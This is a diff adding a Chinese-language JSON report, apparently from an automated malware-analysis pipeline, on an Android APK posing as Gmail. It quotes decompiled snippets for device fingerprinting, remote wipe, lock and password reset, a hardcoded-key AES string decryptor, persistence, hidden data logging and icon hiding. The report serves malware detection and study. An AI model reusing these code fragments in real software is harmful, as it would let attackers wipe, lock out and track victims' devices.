@@ -1,0 +1,205 @@
+{
+  "APK信息": {
+    "文件名": "4e4ae3438f72b4fd53c1ac8c7c5ceb9850c1bcfd84cd15bbccb3ab9b1c6b8ecd.apk",
+    "sha256": "4e4ae3438f72b4fd53c1ac8c7c5ceb9850c1bcfd84cd15bbccb3ab9b1c6b8ecd",
+    "包名": "com.Google.Gmail",
+    "应用名": "Android",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 241.6
+  },
+  "行为列表": [
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getSubscriberId",
+          "getMacAddress"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\Google\\Gmail\\a;",
+          "method_signature": "if((7 + 10)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(googlefr.decryptString(\"daf7dc2b4ade8a7f0de9ac57b977fb36\"));\nreturn telephonyManager.getDeviceId() != null ? telephonyManager.getDeviceId() : Settings.Secure.getString(context.getApplicationContext().getContentResolver(), googlefr.decryptString(\"48a16adcfe069efeafd1cc438055d981\"));",
+          "malicious_code_snippet_context": "          if ((7 + 10) % 10 > 0) {\n          }\n          try {\n>>>             TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(googlefr.decryptString(\"daf7dc2b4ade8a7f0de9ac57b977fb36\"));\n>>>             return telephonyManager.getDeviceId() != null ? telephonyManager.getDeviceId() : Settings.Secure.getString(context.getApplicationContext().getContentResolver(), googlefr.decryptString(\"48a16adcfe069efeafd1cc438055d981\"));\n          } catch (Exception unused) {\n              return null;\n          }",
+          "behavior_description": "该代码通过加密字符串隐藏API调用，使用TelephonyManager.getDeviceId()获取设备IMEI，若为空则回退使用Settings.Secure.getString()获取Android ID作为设备唯一标识。代码中存在控制流混淆（恒真条件if语句）和字符串加密（googlefr.decryptString），伪装类名com.Google.Gmail.a进一步掩盖真实意图。采集的设备指纹数据返回后大概率被上传至C2服务器用于用户追踪或后续攻击。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "resetPassword"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\Google\\Gmail\\C11;",
+          "method_signature": "switch(Integer.parseInt(str)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.D = (DevicePolicyManager) getSystemService(googlefr.decryptString(\"1d07c1c678cf0803257b76151197a471\"));\nswitch (Integer.parseInt(str)) {\n    case 0:\n        this.D.wipeData(0);\n        break;\n    case 1:\n        this.D.lockNow();\n        break;\n    case 2:\n        this.D.resetPassword(str2.trim(), 1);\n        break;\n}",
+          "malicious_code_snippet_context": "          try {\n              this.l = new c(this);\n              if (this.l.a()) {\n>>>                 this.D = (DevicePolicyManager) getSystemService(googlefr.decryptString(\"1d07c1c678cf0803257b76151197a471\"));\n>>>                 switch (Integer.parseInt(str)) {\n>>>                     case 0:\n>>>                         this.D.wipeData(0);\n>>>                         break;\n>>>                     case 1:\n>>>                         this.D.lockNow();\n>>>                         break;\n>>>                     case 2:\n>>>                         if (str2 != googlefr.decryptString(\"7ebcbae63f19cc1993d458519d4b360d\") && str2 != null && str2.trim() != \"\") {\n>>>                             a(a(m, 80L) + f + str2.trim() + f + Boolean.toString(this.D.resetPassword(str2.trim(), 1)));\n>>>                             break;\n                          }\n                          break;\n                  }",
+          "behavior_description": "代码通过 DevicePolicyManager 实现勒索软件的设备锁屏功能。首先通过 googlefr.decryptString 解密获取 \"device_policy\" 服务名，获取 DevicePolicyManager 实例。随后根据外部传入的 str 参数（控制指令）执行不同操作：case 0 调用 wipeData(0) 恢复出厂设置清除用户所有数据；case 1 调用 lockNow() 立即锁屏；case 2 调用 resetPassword(str2, 1) 重置设备密码，将用户锁在设备之外。str2 为新密码，str 为操作类型指令，二者均来自远程控制指令（C2服务器下发或硬编码配置）。字符串使用 googlefr.decryptString 加密混淆以逃避静态检测，类路径伪装为 com.Google.Gmail 进一步表明其恶意伪装意图。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\googleen\\googlefr;",
+          "method_signature": "decipher(String str)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "SecretKeySpec secretKeySpec = new SecretKeySpec(SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA1\").generateSecret(new PBEKeySpec(\"wFow9BMU5phHYl23eRpdPLZZG0Wf2wSQ\".toCharArray(), \"wFow9BMU5phHYl23eRpdPLZZG0Wf2wSQ\".getBytes(), 128, 256)).getEncoded(), \"AES\");\nCipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\ncipher.init(2, secretKeySpec);\nreturn new String(cipher.doFinal(toByte(str)));",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class googlefr {\n      public static String decipher(String str) throws Exception {\n>>>         SecretKeySpec secretKeySpec = new SecretKeySpec(SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA1\").generateSecret(new PBEKeySpec(\"wFow9BMU5phHYl23eRpdPLZZG0Wf2wSQ\".toCharArray(), \"wFow9BMU5phHYl23eRpdPLZZG0Wf2wSQ\".getBytes(), 128, 256)).getEncoded(), \"AES\");\n>>>         Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n>>>         cipher.init(2, secretKeySpec);\n>>>         return new String(cipher.doFinal(toByte(str)));\n      }\n  \n      public static String decryptString(String str) {",
+          "behavior_description": "使用硬编码的密钥和盐值（\"wFow9BMU5phHYl23eRpdPLZZG0Wf2wSQ\"）通过PBKDF2WithHmacSHA1派生AES密钥，对输入字符串进行AES/ECB/PKCS5Padding解密。这是恶意软件常用的字符串/配置解密技术，用于在运行时解密隐藏的C2地址、密钥或其他恶意配置，以逃避静态分析检测。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\Google\\Gmail\\C11;",
+          "method_signature": "if(f2 != null)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "Notification f2 = a.f(getApplicationContext());\nif (f2 != null) {\n    startForeground(2003, f2);\n}\nregisterReceiver(this.E, intentFilter);\nregisterReceiver(this.n, new IntentFilter(googlefr.decryptString(\"954eec9d75a1dd3bcf4de78db463fdbe3617966edcada7551feb6b9aa8b3b0883a764305f3733a13d80c76cb93ddf25a\")));",
+          "malicious_code_snippet_context": "          h = a(m, 4L);\n          i = a(m, 5L);\n          try {\n>>>             Notification f2 = a.f(getApplicationContext());\n>>>             if (f2 != null) {\n>>>                 startForeground(2003, f2);\n>>>             }\n>>>         } catch (Exception unused) {\n>>>         }\n          this.E = new C8();\n          IntentFilter intentFilter = new IntentFilter();\n          intentFilter.addAction(googlefr.decryptString(\"7090f82a2d982f95ecb09722fd2c75b06a6094fe7ae7e0c7647658ce0c6a1edbcd9789a899cb815442f595f2bbed8db8\"));",
+          "behavior_description": "在Service的onCreate中调用startForeground(2003, f2)启动前台服务实现进程保活，防止系统杀后台时回收恶意进程。同时通过googlefr.decryptString解密加密字符串获取Action名称，注册多个BroadcastReceiver监听特定广播事件，结合前台服务保活确保恶意组件持续运行。加密字符串的使用表明行为存在刻意混淆，属于恶意软件常见的持久化驻留手段。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\Google\\Gmail\\C1;",
+          "method_signature": "if((16 + 32)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "format = new SimpleDateFormat(googlefr.decryptString(\"0bbb3fb584c400a99441a71d30088ce9\"), Locale.ENGLISH).format(new Date());\nfile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + googlefr.decryptString(\"ed751dd934f24644ded10d0fe00662f8\") + getApplicationContext().getResources().getString(R.string.s).trim());\nif (file.exists()) {\n    FileWriter fileWriter = new FileWriter(file.getPath() + googlefr.decryptString(\"e7cb61246400723e0ff1c7ee84cebddf\") + format + googlefr.decryptString(\"6e034ed5baf29c96b99b0ff1d7fe03c9\"), true);\n    fileWriter.write(str);\n    fileWriter.close();\n}",
+          "malicious_code_snippet_context": "          if ((16 + 32) % 32 > 0) {\n          }\n          try {\n>>>             format = new SimpleDateFormat(googlefr.decryptString(\"0bbb3fb584c400a99441a71d30088ce9\"), Locale.ENGLISH).format(new Date());\n>>>             file = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + googlefr.decryptString(\"ed751dd934f24644ded10d0fe00662f8\") + getApplicationContext().getResources().getString(R.string.s).trim());\n>>>         } catch (IOException unused) {\n>>>         }\n>>>         if (file.exists()) {\n>>>             FileWriter fileWriter = new FileWriter(file.getPath() + googlefr.decryptString(\"e7cb61246400723e0ff1c7ee84cebddf\") + format + googlefr.decryptString(\"6e034ed5baf29c96b99b0ff1d7fe03c9\"), true);\n>>>             fileWriter.write(str);\n              fileWriter.close();\n          }\n      }",
+          "behavior_description": "该方法将传入的字符串数据str写入到外部存储目录下的文件中。文件路径和扩展名均通过googlefr.decryptString()解密获取，隐藏了真实的文件路径和类型。文件名中包含当前日期时间戳，以追加模式写入，表明该代码在持续收集并持久化存储数据（可能是短信、通话记录、联系人等隐私信息），以便后续窃取或上传到C2服务器。类路径伪装为com.Google.Gmail进一步印证其恶意意图。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\Google\\Gmail\\C1;",
+          "method_signature": "if(packageManager.getComponentEnabledSetting(componentName)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "PackageManager packageManager = getPackageManager();\nComponentName componentName = new ComponentName(getApplicationContext(), (Class<?>) C7.class);\nif (packageManager.getComponentEnabledSetting(componentName) != 2) {\n    packageManager.setComponentEnabledSetting(componentName, 2, 1);\n}",
+          "malicious_code_snippet_context": "          }\n          try {\n              if (getResources().getString(R.string.gp).charAt(0) == '1') {\n>>>                 PackageManager packageManager = getPackageManager();\n>>>                 ComponentName componentName = new ComponentName(getApplicationContext(), (Class<?>) C7.class);\n>>>                 if (packageManager.getComponentEnabledSetting(componentName) != 2) {\n>>>                     packageManager.setComponentEnabledSetting(componentName, 2, 1);\n>>>                 }\n              }\n          } catch (Exception unused) {\n          }",
+          "behavior_description": "代码通过读取资源字符串R.string.gp的配置标志，当条件满足时，使用PackageManager.setComponentEnabledSetting()将目标组件C7设置为COMPONENT_ENABLED_STATE_DISABLED（值2），从而在启动器中隐藏应用图标。该APK伪装为Google Gmail且来自恶意样本集，图标隐藏是恶意软件常用的隐蔽手段，用于避免被用户发现和卸载，为后续恶意活动提供掩护。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
